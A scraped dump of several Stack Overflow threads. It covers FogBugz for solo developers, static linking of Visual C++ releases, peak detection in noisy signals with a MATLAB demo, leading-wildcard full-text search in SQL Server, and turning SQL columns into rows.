<p>(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)</p> <p>I use it, especially since the hosted Version of FugBugz <a href=""http://stackoverflow.com/questions/3180/anyone-soloing-using-fogbugz#3581"">is free for up to 2 people</a>. I found it a lot nicer than paper as I'm working on multiple projects, and my paper tends to get rather messy once you start making annotations or if you want to re-organize and shuffle tasks around, mark them as complete only to see that they are not complete after all...</p>

<p>Plus, the Visual Studio integration is really neat, something paper just cannot compete with. Also, if you lay the project to rest for 6 months and come back, all your tasks and notes are still there, whereas with paper you may need to search all the old documents and notes again, if you did not discard it.</p>

<p>But that is just the point of view from someone who is not really good at staying organized :-) If you are a really tidy and organized person, paper may work better for you than it does for me.</p>

<p>Bonus suggestion: Run Fogbugz on a second PC (or a small Laptop like the eeePC) so that you always have it at your fingertips. The main problem with Task tracking programs - be it FogBugz, Outlook, Excel or just notepad - is that they take up screen space, and my two monitors are usually full with Visual Studio, e-Mail, Web Browsers, some Notepads etc.</p>
 <p>I use it as well and quite frankly wouldn't want to work without it.</p>

<p>I've always had some kind of issue tracker available for the projects I work on and thus am quite used to updating it. With FB6 the process is now even better.</p>

<p>Since FB also integrates with Subversion, the source control tool I use for my projects, the process is really good and I have two-way links between the two systems now. I can click on a case number in the Subversion logs and go to the case in FB, or see the revisions bound to a case inside FB.</p> <P>When I was working for myself doing my consulting business I signed up for a hosted account and honestly I couldn't have done without it. </P>
<P>What I liked most about it was it took 30 seconds to sign up for an account and I was then able to integrate source control using sourcegear vault (which is an excellent source control product and free for single developers) set up projects, clients, releases and versions and monitor my progress constantly.</P>
<P>One thing that totally blew me away was that I ended up completely abandoning outlook for all work related correspondence. I could manage all my client interactions from within fogbugz and it all just worked amazingly well.</P>
<P>In terms of overhead, one of the nice things you could do was turn anything into a case. Anything that came up in your mind while you were coding, you simply created a new email, sent it to fogbugz and it was instantly added as an item for review later.</P>
<P>I would strongly recommend you get yourself one of the hosted accounts and give it a whirl</P> <p>In addition to the benefits already mentioned, another nice feature of using FogBugz is BugzScout, which you can use to report errors from your app and log them into FogBugz automatically.  If you're a one person team, chances are there are some bugs in your code you've never seen during your own testing, so it's nice to have those bugs found ""in the wild"" automatically reported and logged for you.</p> <p>Go to <a href=""http://www.fogbugz.com/"" rel=""nofollow"">http://www.fogbugz.com/</a> then at the bottom under ""Try It"", sign up.</p>

<p>under Settings =&gt; Your FogBugz Hosted Account, it should either already say ""Payment Information:    Using Student and Startup Edition."" or there should be some option/link to turn on the Student and Startup Edition.</p>

<p>And yes, it's not only for Students and Startups, I asked their support :-)</p>

<p>Disclaimer: I'm not affiliated with FogCreek and Joel did not just deposit money in my account.</p> <p>I think it's great that Joel et al. let people use FogBugs hosted for free on their own.  It's a great business strategy, because the users become fans (it is great software after all), and then they recommend it to their businesses or customers.</p>
 <p>Yea FogBugz is great for process-light, quick and easy task management.  It seems especially well suited for soloing, where you don't need or want a lot of complexity in that area.  </p>

<p>By the way, if you want to keep track of what you're doing at the computer all day, check out TimeSprite, which integrates with FogBugz.  It's a Windows app that logs your active window and then categorizes your activity based on the window title / activity type mappings you define as you go.  (You can also just tell it what you're working on.)  And if you're a FogBugz user, you can associate your work with a FogBugz case, and it will upload your time intervals for that case.  This makes accurate recording of elapsed time pretty painless and about as accurate as you can get, which in turn improves FogBugz predictive powers in its evidence-based scheduling.  Also, when soloing, I find that such specific logging of my time keeps me on task, in the way a meandering manager otherwise might. (I'm not affiliated with TimeSprite in any way.)</p>
"
"How do you pack a visual studio c++ project for release? <p>I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.</p>

<p>Without doing this you get the error message that the application configuration is not correct and to reinstall.  </p> You'd be looking to static link (as opposed to dynamically link)

I'm not sure how many of the MS redistributables statically link in. <p>If you are looking to find out which dll's your target machine is missing then use depends.exe which used to come with MSDev, but can also be found <a href=""http://dependencywalker.com/"" rel=""nofollow"">here</a>. Testing this on a few target machines should tell you which dll's you need to package with your application.</p> <P>You need to set the run-time library (Under C/C++ -&gt; Code Generation) for ALL projects to static linkage, which correlates to the following default building configurations:</P>
<UL>
<LI>Multithreaded Debug/Release</LI>
<LI>Singlethreaded Debug/Release</LI></UL>
<P>As opposed to the ""DLL"" versions of those libraries.</P>
<P>Even if you do that, depending on the libraries you're using, you might have to install a Merge Module/framework/etc. It depends on whether static LIB versions of your dependencies are available.</P> <ol>
<li>Choose Project -> Properties</li>
<li>Select Configuration -> General</li>
<li>In the box for how you should link MFC, choose to statically link it.</li>
<li>Choose Linker -> Input.  Under <strong>Additional Dependencies</strong>, add any libraries you need your app to statically link in.</li>
</ol>

<p>For more info, see this article: <a href=""http://www.geekadmin.com/?p=34"">http://www.geekadmin.com/?p=34</a></p>
 <p>Be aware that <a href=""http://blogs.msdn.com/martynl/archive/2005/10/13/480880.aspx"" rel=""nofollow"">Microsoft do not recommend that you static link the runtime into your project</a>, as this prevents it from being serviced by windows update to fix critical security bugs. There are also potential problems if you are passing memory between your main .exe and .dll files as if each of these static links the runtime you can end up with malloc/free mismatch problems.</p>

<p>You can include the DLLs with the executable, without compiling them into the .exe and without running the redist tool - this is what I do and it seems to work fine. </p>

<p>The only fly in the ointment is that you need to include the files twice if you're distributing for a wide range of Windows versions - newer OSs need the files in manifest-defined directories, and older ones want all the files in the program directory.</p>
"
"Peak detection of measured signal <p>We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.</p>

<p>This works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.</p>

<p>My initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?</p>

<hr>

<p>We do use LabVIEW and I have checked the <a href=""http://forums.lavag.org/Peak-Detection-t8499.html"">LAVA forums</a> and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code. </p>
 <p>You could try signal averaging, i.e. for each point, average the value with the surrounding 3 or more points. If the noise blips are huge, then even this may not help.</p>

<p>I realise that this was language agnostic, but guessing that you are using LabView, there are lots of pre-packaged signal processing VIs that come with LabView that you can use to do smoothing and noise reduction. The <a href=""http://forums.ni.com/"">NI forums</a> are a great place to get more specialised help on this sort of thing.</p> <p>You could apply some <a href=""http://en.wikipedia.org/wiki/Standard_deviations"" rel=""nofollow"">Standard Devision</a> to your logic and take notice of peaks over x%.</p> <p>I think you want to <a href=""http://en.wikipedia.org/wiki/Cross-correlation"" rel=""nofollow"">cross-correlate</a> your signal with an expected, exemplar signal. But, it has been such a long time since I studied signal processing and even then I didn't take much notice.</p> <p>I don't know very much about instrumentation, so this might be totally impractical, but then again it might be a helpful different direction.  If you know how the readings can fail, and there is a certain interval between peaks given such failures, why not do gradient descent at each interval.  If the descent brings you back to an area you've searched before, you can abandon it.  Depending upon the shape of the sampled surface, this also might help you find peaks faster than search.</p> <p>This problem has been studied in some detail. </p>

<p>There are a set of very up-to-date implementations in the <code>TSpectrum*</code> classes of <A href=""http://root.cern.ch/"">ROOT</A> (a nuclear/particle physics analysis tool). The code works in one- to three-dimensional data.</p>

<p>The ROOT source code is available, so you can grab this implementation if you want.</p>

<p>From the <A href=""http://root.cern.ch/root/html/TSpectrum.html"">TSpectrum</A> class documentation:</p>

<p>The algorithms used in this class have been published in the following references:</p>

<blockquote>
  <p>[1] M.Morhac et al.: Background
  elimination methods for
  multidimensional coincidence gamma-ray
  spectra. Nuclear Instruments and
  Methods in Physics Research A 401
  (1997) 113-
  132.</p>
  
  <p>[2]  M.Morhac et al.: Efficient one- and two-dimensional Gold
  deconvolution and its application to
  gamma-ray spectra decomposition.
  Nuclear Instruments and Methods in
  Physics Research A 401 (1997) 385-408.</p>
  
  <p>[3]  M.Morhac et al.: Identification of peaks in
  multidimensional coincidence gamma-ray
  spectra. Nuclear Instruments and
  Methods in Research Physics A 
  443(2000), 108-125.</p>
</blockquote>

<p>The papers are linked from the class documentation for those of you who don't have a NIM online subscription.</p>

<p><hr /></p>

<p>The short version of what is done is that the histogram flattened to eliminate noise, and then local maxima are detected by brute force in the flattened histogram. </p>
 <p>This method is basically from David Marr's  book ""Vision""</p>

<p>Gaussian blur your signal with the expected width of your peaks.
this gets rid of noise spikes and your phase data is undamaged.</p>

<p>Then edge detect (LOG will do)</p>

<p>Then your edges were the edges of features (like peaks).
look between edges  for peaks, sort peaks by size, and you're done.</p>

<p>I have used variations on this and they work very well.</p>
 <p>Is there a qualitative difference between the desired peak and the unwanted second peak? If both peaks are ""sharp"" -- i.e. short in time duration -- when looking at the signal in the frequency domain (by doing FFT) you'll get energy at most bands. But if the ""good"" peak reliably has energy present at frequencies not existing in the ""bad"" peak, or vice versa, you may be able to automatically differentiate them that way.</p>
 <p>There are lots and lots of classic peak detection methods, any of which might work.  You'll have to see what, in particular, bounds the quality of your data.  Here are basic descriptions:</p>

<ol>
<li><p>Between any two points in your data, (x(0),y(0)) and (x(n),y(n)), add up y(i+1)-y(i) for 0 &lt;= i &lt; n and call this T (""travel"") and set R (""rise"") to y(n)- y(0) + k for suitably small k.  T/R > 1 indicates a peak.  This works OK if large travel due to noise is unlikely or if noise distributes symmetrically around a base curve shape.  For your application, accept the earliest peak with a score above a given threshold, or analyze the curve of travel per rise values for more interesting properties.</p></li>
<li><p>Use matched filters to score similarity to a standard peak shape (essentially, use a normalized dot-product against some shape to get a cosine-metric of similarity)</p></li>
<li><p>Deconvolve against a standard peak shape and check for high values (though I often find 2 to be less sensitive to noise for simple instrumentation output).</p></li>
<li><p>Smooth the data and check for triplets of equally spaced points where, if x0 &lt; x1 &lt; x2, y1 > 0.5*(y0+y2), or check Euclidean distances like this:  D((x0,y0),(x1,y1)) + D((x1,y1),(x2,y2)) > D((x0,y0),(x2,y2)), which relies on the triangle inequality.  Using simple ratios will again provide you a scoring mechanism.</p></li>
<li><p>Fit a very simple 2-gaussian mixture model to your data (for example, Numerical Recipes has a nice ready-made chunk of code).  Take the earlier peak.  This will deal correctly with overlapping peaks.</p></li>
<li><p>Find the best match in the data to a simple Gaussian, Cauchy, Poisson, or what-have-you curve.  Evaluate this curve over a broad range and subtract it from a copy of the data after noting it's peak location.  Repeat.  Take the earliest peak whose model parameters (standard deviation probably, but some applications might care about kurtosis or other features) meet some criterion.  Watch out for artifacts left behind when peaks are subtracted from the data.
Best match might be determined by the kind of match scoring suggested in #2 above.</p></li>
</ol>

<p>I've done what you're doing before:  finding peaks in DNA sequence data, finding peaks in derivatives estimated from measured curves, and finding peaks in histograms.</p>

<p>I encourage you to attend carefully to proper baselining.  Wiener filtering or other filtering or simple histogram analysis is often an easy way to baseline in the presence of noise.</p>

<p>Finally, if your data is typically noisy and you're getting data off the card as unreferenced single-ended output (or even referenced, just not differential), and if you're averaging lots of observations into each data point, try sorting those observations and throwing away the first and last quartile and averaging what remains.  There are a host of such outlier elimination tactics that can be really useful.</p>
 <p>I would like to contribute to this thread an algorithm that <a href=""http://stackoverflow.com/questions/22583391/peak-detection-in-realtime-timeseries-data"">I have developed myself</a>:</p>

<p>This algorithm signals when the data points are a specified number of standard deviations away from the moving mean. However, when a signal is detected, subsequent data points that are also a signal (so significantly away from the moving mean), will not corrupt the signal threshold. That is, the algorithm creates a  '<em>new mean</em>' and '<em>new st.dev.</em>' in which the data points that are signals are <em>not</em> used. Therefore, the threshold remains uncorrupted and is able to correctly identify future signals too, without loss of performance. This works extremely well!</p>

<p>In order to display the power of this robust algorithm, I have prepared a demo in which the user can specify its own data. This little demo displays both how the algorithm works and why it is so useful. </p>

<p><a href=""http://i.stack.imgur.com/w99xQ.gif"" rel=""nofollow""><img src=""http://i.stack.imgur.com/w99xQ.gif"" alt=""enter image description here""></a></p>

<p><strong>The full working Matlab code for this demo</strong>:</p>

<pre><code>function [] = RobustDetectionDemo()

%% SPECIFICATIONS
LAG         = 10;       % lag for the moving mean and moving st. dev.
DIFF        = 3.5;      % number of st. dev. from the mean to signal
INFLUENCE   = 0.0;      % when signal: how much is mean/st.dev. influenced?
                            % or e.g. 0.05/0.1 for influencing
DIRECTION   = 'both';   % signal when 'up'/'down'/'both' from the mean

%%
figure(1);
subplot(2,2,1);
title('Draw 30 data points');
ylim([0 5]); xlim([0 50]);
[x,y] = ginputExtra_realtime(30, true, LAG, DIFF, INFLUENCE, DIRECTION);
end

function [x y] = ginputExtra_realtime(n,booText, LAG, DIFF, INFLUENCE, DIRECTION)
if booText == true
    bText = booText;
else
    bText = false;
end
H = gca;
set(H, 'YLimMode', 'manual'); set(H, 'XLimMode', 'manual');
set(H, 'YLim', get(H,'YLim')); set(H, 'XLim', get(H,'XLim'));
numPoints = n; xg = []; yg = [];
for i=1:numPoints
    [xi yi] = ginput(1);
    xg = [xg xi]; yg = [yg yi];
    if i == 1
        hold on;
        plot(H, xg(i),yg(i),'ro');
        if bText text(xg(i),yg(i),num2str(i),'FontSize',12); end
    else
        plot(xg([i-1:i]),yg([i-1:i]),'r');
        if bText text(xg(i),yg(i),num2str(i),'FontSize',12); end
        if length(xg) &gt; LAG
            robustMA(xg, yg, LAG, DIFF, INFLUENCE, DIRECTION);
        end
    end    
end
hold off;
x = xg; y = yg;
end

function [] = robustMA( x, y, lag, diff, influence, direction)

% robustMA  :: Signal detection algorithm ::
% Author: Jean-Paul van Brakel

% ************************************************************ %
% TO BE USED FOR: *determining significant and sudden changes*
% ************************************************************ %

% x     = x-axis data
% y     = y-axis data
% lag   = lag of moving mean and moving st.dev.
% diff  = number of st.dev. away from the mean in order to give a signal
% influence = number between 0 and 1 that indicates influence of signals
% direction = 'up'/'down'/'both' which means the following:
%               - 'up'  : only signal for deviations ABOVE the mean
%               - 'down': only signal for deviations BELOW the mean
%               - 'both': signal for deviations ABOVE and BELOW the mean

p = y;
outputmean  = tsmovavg(y,'s',lag,2);
outputstdev = movingstd(y,lag,'backward');

newMean  = zeros(1, length(outputmean));
newStdev = zeros(1, length(outputmean));
signals  = ones(1, length(outputmean));

newMean(lag-1)  = outputmean(lag);
newStdev(lag-1) = outputstdev(lag);

for i = lag:length(outputmean)
   if strcmp(direction, 'up')
       if (p(i) &gt; newMean(i-1)+diff*newStdev(i-1))
          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);
          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);
          signals(i)  = 2;
       else
          newMean(i)  = (newMean(i-1)+p(i))/2;
          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; 
          signals(i)  = 1;
       end
   elseif strcmp(direction, 'down')
       if (p(i) &lt; newMean(i-1)-diff*newStdev(i-1))
          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);
          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);
          signals(i)  = 2;
       else
          newMean(i)  = (newMean(i-1)+p(i))/2;
          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; 
          signals(i)  = 1;
       end
   elseif strcmp(direction, 'both')
       if (p(i) &gt; newMean(i-1)+diff*newStdev(i-1) || ...
           p(i) &lt; newMean(i-1)-diff*newStdev(i-1))
          newMean(i)  = (newMean(i-1)  + influence*p(i))/(1+influence);
          newStdev(i) = (newStdev(i-1) + influence*sqrt((p(i)-newMean(i-1))^2))/(1+influence);
          signals(i)  = 2;
       else
          newMean(i)  = (newMean(i-1)+p(i))/2;
          newStdev(i) = (newStdev(i-1) + sqrt((p(i)-newMean(i-1))^2))/2; 
          signals(i)  = 1;
       end
   end
end

figure(1);
subplot(2,2,2);
hold on;
title('Algorithm output');
area(x, newMean+diff*newStdev, 'FaceColor', [0.9 0.9 0.9], 'EdgeColor', 'none');
area(x, newMean, 'FaceColor', [1 1 1], 'EdgeColor', 'none');
area(x, newMean, 'FaceColor', [0.9 0.9 0.9], 'EdgeColor', 'none');
area(x, newMean-diff*newStdev, 'FaceColor', [1 1 1], 'EdgeColor', 'none');
plot(x, p, ':r', 'LineWidth', 1, 'Color', 'black');
plot(x, newMean, 'LineWidth', 2, 'Color', 'red');
plot(x, newMean+newStdev, 'LineWidth', 2, 'Color', 'green');
plot(x, newMean-newStdev, 'LineWidth', 2, 'Color', 'green');
xlim([0 50]);   ylim([0 5])
hold off;
subplot(2,2,4);
hold on;
title('Signal output');
stairs(x, signals, 'LineWidth', 2, 'Color', 'blue');
ylim([0 3]);    xlim([0 50]);
hold off;

end

function s = movingstd(x,k,windowmode)
% movingstd: efficient windowed standard deviation of a time series
% usage: s = movingstd(x,k,windowmode)
%
% Movingstd uses filter to compute the standard deviation, using
% the trick of std = sqrt((sum(x.^2) - n*xbar.^2)/(n-1)).
% Beware that this formula can suffer from numerical problems for
% data which is large in magnitude.

% check for a windowmode
if (nargin&lt;3) || isempty(windowmode)
  % supply the default: 
  windowmode = 'central';
elseif ~ischar(windowmode)
  error 'If supplied, windowmode must be a character flag.'
end
% check for a valid shortening.
valid = {'central' 'forward' 'backward'};
windowmode = lower(windowmode);
ind = strmatch(windowmode,valid);
if isempty(ind)
  error 'Windowmode must be a character flag: ''c'', ''b'', or ''f''.'
else
  windowmode = valid{ind};
end

% length of the time series
n = length(x);

% check for valid k
if (nargin&lt;2) || isempty(k) || (rem(k,1)~=0)
  error 'k was not provided or not an integer.'
end
switch windowmode
  case 'central'
    if k&lt;1
      error 'k must be at least 1 for windowmode = ''central''.'
    end
    if n&lt;(2*k+1)
      error 'k is too large for this short of a series and this windowmode.'
    end
  otherwise
    if k&lt;2
      error 'k must be at least 2 for windowmode = ''forward'' or ''backward''.'
    end
    if (n&lt;k)
      error 'k is too large for this short of a series.'
    end
end

% Improve the numerical analysis by subtracting off the series mean
% this has no effect on the standard deviation.
x = x - mean(x);

% we will need the squared elements 
x2 = x.^2;

% split into the three windowmode cases for simplicity
A = 1;
switch windowmode
  case 'central'
    B = ones(1,2*k+1);
    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/(2*k+1)))/(2*k));
    s(k:(n-k)) = s((2*k):end);
  case 'forward'
    B = ones(1,k);
    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/k))/(k-1));
    s(1:(n-k+1)) = s(k:end);
  case 'backward'
    B = ones(1,k);
    s = sqrt((filter(B,A,x2) - (filter(B,A,x).^2)*(1/k))/(k-1));
end

% special case the ends as appropriate
switch windowmode
  case 'central'
    % repairs are needed at both ends
    for i = 1:k
      s(i) = std(x(1:(k+i)));
      s(n-k+i) = std(x((n-2*k+i):n));
    end
  case 'forward'
    % the last k elements must be repaired
    for i = (k-1):-1:1
      s(n-i+1) = std(x((n-i+1):n));
    end
  case 'backward'
    % the first k elements must be repaired
    for i = 1:(k-1)
      s(i) = std(x(1:i));
    end
end
end
</code></pre>

<p>The necessary parameters are:</p>

<ul>
<li><code>LAG</code>: lag for the moving mean and moving st. dev.</li>
<li><code>DIFF</code>: number of st. dev. away from the mean to generate a signal</li>
<li><code>INFLUENCE</code>: when there is a signal, how much is mean/st.dev. influenced? (number between 0-1)</li>
<li><code>DIRECTION</code>: signal when deviation is 'up'/'down'/'both' away from the mean?</li>
</ul>

<p>As you can see, I used the settings <code>LAG=10; DIFF=3.5; INFLUENCE=0;</code> for this demo. Feel free to fiddle around with these parameters and study the differences in performance of the algorithm. </p>
"
"How do you get leading wildcard full-text searches to work in SQL Server? <p><strong>Note:</strong> I <em>am</em> using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.</p>

<p>I've read in several places now that ""leading wildcard"" searches (e.g. using ""*overflow"" to match ""stackoverflow"") is not supported in MS SQL.  I'm considering using a <a href=""http://blogs.msdn.com/sqlclr/archive/2005/06/29/regex.aspx"">CLR function to add regex matching</a>, but I'm curious to see what other solutions people might have.</p>

<p><strong>More Info</strong>: <a href=""http://msdn.microsoft.com/en-us/library/ms552152.aspx"">You can add the asterisk only at the end of the word or phrase.</a> - along with my empirical experience:  When matching ""myvalue"", ""my*"" works, but ""(asterisk)value"" returns no match, when doing a query as simple as:</p>

<pre><code>SELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '""*searchterm""');
</code></pre>

<p>Thus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.</p>
 <p>The wildcard character in SQL Server is the <code>%</code> sign and it works just fine, leading, trailing or otherwise.</p>

<p>That said, if you're going to be doing any kind of serious full text searching then I'd consider utilising the Full Text Index capabilities. Using <code>%</code> and <code>_</code> wild cards will cause your database to take a serious performance hit.</p>
 <pre><code>% Matches any number of characters<br>_ Matches a single character<br></code></pre>

<p>I've never used Full-Text indexing but you can accomplish rather complex and fast search queries with simply using the build in T-SQL string functions.</p> <p>One thing worth keeping in mind is that leading wildcard queries come at a significant performance premium, compared to other wildcard usages.</p> <p>The problem with leading Wildcards: They cannot be indexed, hence you're doing a full table scan.</p> <p>Using the '%' character I've searched our database using something like the following:</p>

<pre><code>SELECT name FROM TblNames WHERE name LIKE '%overflow'
</code></pre>

<p>Using this form or query can be slow at times but we only use it for the occasional manual search.</p> <P>From SQL Server Books Online:</P>
<BLOCKQUOTE>
<P>To write full-text queries in Microsoft SQL Server 2005, you must learn how to use the CONTAINS and FREETEXT Transact-SQL predicates, and the CONTAINSTABLE and FREETEXTTABLE rowset-valued functions.</P></BLOCKQUOTE>
<P>That means all of the queries written above with the % and _ are not valid full text queries.</P>
<P>Here is a sample of what a query looks like when calling the CONTAINSTABLE function.</P>
<BLOCKQUOTE>
<P>SELECT RANK , * FROM TableName , CONTAINSTABLE (TableName, <EM>, ' ""</EM>WildCard"" ') searchTable WHERE [KEY] = TableName.pk ORDER BY searchTable.RANK DESC</P></BLOCKQUOTE>
<P>In order for the CONTAINSTABLE function to know that I'm using a wildcard search, I have to wrap it in double quotes. I can use the wildcard character * at the beginning or ending. There are a lot of other things you can do when you're building the search string for the CONTAINSTABLE function. You can search for a word near another word, search for inflectional words (drive = drives, drove, driving, and driven), and search for synonym of another word (metal can have synonyms such as aluminum and steel).</P>
<P>I just created a table, put a full text index on the table and did a couple of test searches and didn't have a problem, so wildcard searching works as intended.</P>
<P>[Update]</P>
<P>I see that you've updated your question and know that you need to use one of the functions.</P>
<P>You can still search with the wildcard at the beginning, but if the word is not a full word following the wildcard, you have to add another wildcard at the end.</P>Example:  ""*ildcar"" will look for a single word as long as it ends with ""ildcar"".<BR><BR>Example:  ""*ildcar*"" will look for a single word with ""ildcar"" in the middle, which means it will match ""wildcard"".  [Just noticed that Markdown removed the wildcard characters from the beginning and ending of my quoted string here.]<BR>
<P>[Update #2]</P>
<P>Dave Ward - Using a wildcard with one of the functions shouldn't be a huge perf hit. If I created a search string with just ""*"", it will not return all rows, in my test case, it returned 0 records.</P> <p>When it comes to full-text searching, for my money nothing beats <a href=""http://lucene.apache.org"" rel=""nofollow"">Lucene</a>.  There is a <a href=""http://incubator.apache.org/projects/lucene.net.html"" rel=""nofollow"">.Net port available</a> that is compatible with indexes created with the Java version.</p>

<p>There's a little work involved in that you have to create/maintain the indexes, but the search speed is fantastic and you can create all sorts of interesting queries.  Even indexing speed is pretty good - we just completely rebuild our indexes once a day and don't worry about updating them.</p>

<p>As an example, <a href=""http://www.wateronline.com/Search.mvc?keyword=wastewater"" rel=""nofollow"">this search functionality</a> is powered by Lucene.Net.</p> <p>Just FYI, Google does not do any substring searches or truncation, right or left.  They have a wildcard character * to find unknown words in a phrase, but not a word.   </p>

<p>Google, along with most full-text search engines, sets up an inverted index based on the alphabetical order of words, with links to their source documents.  Binary search is wicked fast, even for huge indexes.  But it's really really hard to do a left-truncation in this case, because it loses the advantage of the index.  </p>
 <p>Workaround only for leading wildcard:</p>

<ul>
<li>store the text reversed in a different field (or in materialised view)</li>
<li>create a full text index on this column</li>
<li><p>find the reversed text with an *</p>

<pre><code>SELECT * 
FROM TABLENAME 
WHERE CONTAINS(TextColumnREV, '""mrethcraes*""');
</code></pre></li>
</ul>

<p>Of course there are many drawbacks, just for quick workaround...</p>

<p>Not to mention CONTAINSTABLE...</p>
 <p>It is possible to use the wildcard ""*"" at the end of the word or phrase (prefix search).</p>

<p>For example, this query will find all ""datab"", ""database"", ""databases"" ...</p>

<pre><code>SELECT * FROM SomeTable WHERE CONTAINS(ColumnName, '""datab*""')
</code></pre>

<p>But, unforutnately, it is not possible to search with leading wildcard.</p>

<p>For example, this query will not find ""database""</p>

<pre><code>SELECT * FROM SomeTable WHERE CONTAINS(ColumnName, '""*abase""')
</code></pre>
 <p>To perhaps add clarity to this thread, from my testing on 2008 R2, Franjo is correct above. When dealing with full text searching, at least when using the CONTAINS phrase, you cannot use a leading <em>, only a trailing</em> functionally. * is the wildcard, not % in full text.</p>

<p>Some have suggested that * is ignored. That does not seem to be the case, my results seem to show that the trailing * functionality does work. I think leading * are ignored by the engine.</p>

<p>My added problem however is that the same query, with a trailing *, that uses full text with wildcards worked relatively fast on 2005(20 seconds), and slowed to 12 minutes after migrating the db to 2008 R2. It seems at least one other user had similar results and he started a forum post which I added to...   FREETEXT works fast still, but something ""seems"" to have changed with the way 2008 processes trailing * in CONTAINS. They give all sorts of warnings in the Upgrade Advisor that they ""improved"" FULL TEXT so your code may break, but unfortunately they do not give you any specific warnings about certain deprecated code etc. ...just a disclaimer that they changed it, use at your own risk. </p>

<p><a href=""http://social.msdn.microsoft.com/Forums/ar-SA/sqlsearch/thread/7e45b7e4-2061-4c89-af68-febd668f346c"" rel=""nofollow"">http://social.msdn.microsoft.com/Forums/ar-SA/sqlsearch/thread/7e45b7e4-2061-4c89-af68-febd668f346c</a></p>

<p>Maybe, this is the closest MS hit related to these issues... <a href=""http://msdn.microsoft.com/en-us/library/ms143709.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/ms143709.aspx</a></p>
 <p>As a parameter in a stored procedure you can use it as:</p>

<pre><code>ALTER procedure [dbo].[uspLkp_DrugProductSelectAllByName]
(
    @PROPRIETARY_NAME varchar(10)
)
as
    set nocount on
    declare @PROPRIETARY_NAME2 varchar(10) = '""' + @PROPRIETARY_NAME + '*""'

    select ldp.*, lkp.DRUG_PKG_ID
    from Lkp_DrugProduct ldp
    left outer join Lkp_DrugPackage lkp on ldp.DRUG_PROD_ID = lkp.DRUG_PROD_ID
    where contains(ldp.PROPRIETARY_NAME, @PROPRIETARY_NAME2)
</code></pre>
 <p>Perhaps the following link will provide the final answer to this use of wildcards: <a href=""https://blogs.msdn.microsoft.com/sqlforum/2011/02/27/faq-how-can-i-perform-wildcard-searches-in-full-text-search/"" rel=""nofollow"">Performing FTS Wildcard Searches</a>.</p>

<p>Note the passage that states: ""However, if you specify “<em>Chain” or “Ch</em>ain”, you will not get the expected result. The asterisk will be considered as a normal punctuation mark not a wildcard character. ""</p>
"
"How do I Transform Sql Columns into Rows? <p>I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.</p>

<p>I have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.</p>

<pre><code>TableA
Column1, Column2, Column3
</code></pre>

<p>SQL Statement to ruturn</p>

<pre><code>ResultA
Value of Column1
Value of Column2
Value of Column3
</code></pre>

<hr>

<p><strong>@Kevin:</strong> I've had a google search on the topic but alot of the example where overly complex for my example, <strong>are you able to help further?</strong></p>

<p>@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3</p>
 <P>You should take a look at the UNPIVOT clause.</P>
<P><STRONG>Update1</STRONG>: GateKiller, strangely enough I read an article (about something unrelated) about it this morning and I'm trying to jog my memory where I saw it again, had some decent looking examples too. It'll come back to me I'm sure.</P>
<P><STRONG>Update2</STRONG>: Found it: <A href=""http://weblogs.sqlteam.com/jeffs/archive/2008/04/23/unpivot.aspx"" rel=""nofollow"">http://weblogs.sqlteam.com/jeffs/archive/2008/04/23/unpivot.aspx</A></P> <p><a href=""http://msdn.microsoft.com/en-us/library/ms180026.aspx"" rel=""nofollow"">UNION</a> should be your friend:</p>

<pre><code>SELECT Column1 FROM table WHERE idColumn = 1<br>UNION ALL<br>SELECT Column2 FROM table WHERE idColumn = 1<br>UNION ALL<br>SELECT Column3 FROM table WHERE idColumn = 1<br></code></pre>

<p>but it can <a href=""http://blog.falafel.com/2006/01/20/TSQLTipAvoidUNION.aspx"" rel=""nofollow"">also be your foe</a> on large result sets.</p> <P>If you have a fixed set of columns and you know what they are, you can basically do a series of subselects </P>
<P><CODE>(SELECT Column1 AS ResultA FROM TableA) as R1</CODE> </P>
<P>and join the subselects. All this in a single query.</P> <p>I'm not sure of the SQL Server syntax for this but in MySQL I would do</p>

<pre><code>SELECT IDColumn, ( IF( Column1 &gt;= 3, 1, 0 ) + IF( Column2 &gt;= 3, 1, 0 ) + IF( Column3 &gt;= 3, 1, 0 ) + ... [snip ] )
  AS NumberOfColumnsGreaterThanThree
FROM TableA;
</code></pre>

<p>EDIT: A very (very) brief Google search tells me that the <code>CASE</code> statement does what I am doing with the <code>IF</code> statement in MySQL.  You may or may not get use out of <a href=""http://www.craigsmullins.com/ssu_0899.htm"" rel=""nofollow"">the Google result I found</a></p>

<p>FURTHER EDIT: I should also point out that this isn't an answer to your question but an alternative solution to your actual problem.</p>
